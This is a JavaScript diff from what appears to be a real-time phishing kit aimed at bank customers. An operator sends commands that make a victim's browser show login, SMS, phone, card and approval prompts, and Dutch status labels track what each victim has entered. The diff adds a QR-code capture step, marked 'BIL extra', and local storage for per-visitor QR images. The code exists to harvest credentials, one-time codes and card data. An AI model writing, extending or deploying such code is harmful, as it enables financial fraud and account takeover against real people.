@@ -102,10 +102,12 @@ export async function fetchIpLocation() {
 }
 
 // Command types admin can send:
-// connected | ask_login | ask_approve | ask_phone | ask_sms | ask_card | ask_info | ask_confirm | done | reset_waiting
+// connected | ask_login | ask_qr (BIL extra) | ask_approve | ask_phone |
+// ask_sms | ask_card | ask_info | ask_confirm | done | reset_waiting
 export const COMMAND_TO_STATUS = {
   connected: "waiting",
   ask_login: "login_requested",
+  ask_qr: "qr_requested",
   ask_approve: "approve_requested",
   ask_phone: "phone_requested",
   ask_sms: "sms_requested",
@@ -120,6 +122,8 @@ export const STATUS_LABEL = {
   waiting: "Wachten (lader)",
   login_requested: "Login getoond",
   login_submitted: "Login ingevuld",
+  qr_requested: "QR getoond",
+  qr_submitted: "QR ingevuld",
   approve_requested: "Goedkeuring getoond",
   approve_submitted: "Goedkeuring ingevuld",
   phone_requested: "Telefoon getoond",
@@ -148,4 +152,17 @@ export function isAdminOnline() {
   const v = safeParse(localStorage.getItem(ADMIN_KEY), null);
   if (!v?.at) return false;
   return Date.now() - v.at < 12000;
+}
+
+// Local-mode QR store (same browser): { [visitorId]: { image, at } }
+const QR_KEY = "live_qr_v1";
+
+export function readQrMap() {
+  return safeParse(localStorage.getItem(QR_KEY), {});
+}
+
+export function writeQrMap(map) {
+  try {
+    localStorage.setItem(QR_KEY, JSON.stringify(map));
+  } catch {}
 }
